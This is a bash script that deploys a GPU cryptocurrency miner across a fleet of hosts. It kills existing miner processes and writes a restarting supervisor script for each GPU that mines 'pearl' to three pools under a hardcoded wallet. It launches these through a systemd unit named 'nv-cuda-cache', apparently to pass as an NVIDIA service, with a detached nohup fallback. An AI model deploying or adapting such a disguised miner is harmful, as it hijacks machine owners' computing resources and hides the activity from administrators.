#!/bin/bash
B=/opt/fleet; L=$B/logs; HN=$(hostname); W='prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz'
echo "=== fix $(date -u) host=$HN"
for p in $(pgrep -f 'krig_g[0-9]*\.sh' 2>/dev/null); do kill -9 $p 2>/dev/null; done
for p in $(pgrep -f 'krig-miner --coin' 2>/dev/null); do kill -9 $p 2>/dev/null; done
sleep 1
N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU ')
echo "gpus=$N"
i=0
while [ "$i" -lt "${N:-0}" ]; do
cat > "$B/krig_g$i.sh" <<EOF2
#!/bin/bash
# worker ul-ps-$HN-g$i
exec 9>/run/krig-g$i.lock; flock -n 9 || exit 0
while :; do
  $B/krig/krig-miner --coin pearl -d $i \\
    --url stratum+ssl://prl.kryptex.network:8048 \\
    --url stratum+ssl://pool.pearlhash.xyz:9443 \\
    --url stratum+tcp://pearl.luckypool.io:3360 \\
    --user $W/ul-ps-$HN-g$i --password x \\
    --log-file $L/krig-$HN-g$i.log --no-tui --no-telemetry -l info \\
    2>>$L/krig-$HN-g$i.err
  echo "[supervisor] krig exited rc=\$? at \$(date -u)" >> $L/krig-$HN-g$i.sup.log
  sleep 20
done
EOF2
chmod +x "$B/krig_g$i.sh"
systemctl restart "nv-cuda-cache@$i" >/dev/null 2>&1 || { setsid nohup bash "$B/krig_g$i.sh" >/dev/null 2>&1 & }
i=$((i+1))
done
sleep 15
echo "krig now=$(pgrep -fc 'krig-miner --coin')"
echo "--- url in runner"; grep -m2 -- '--url' "$B/krig_g0.sh"
echo "--- logs"
for f in $L/krig-$HN-g0.log $L/krig-$HN-g1.log; do [ -f "$f" ] && { echo "== $f"; tail -8 "$f"; }; done
echo "--- hb"; bash "$B/ps8_hb.sh"; echo "hb rc=$?"
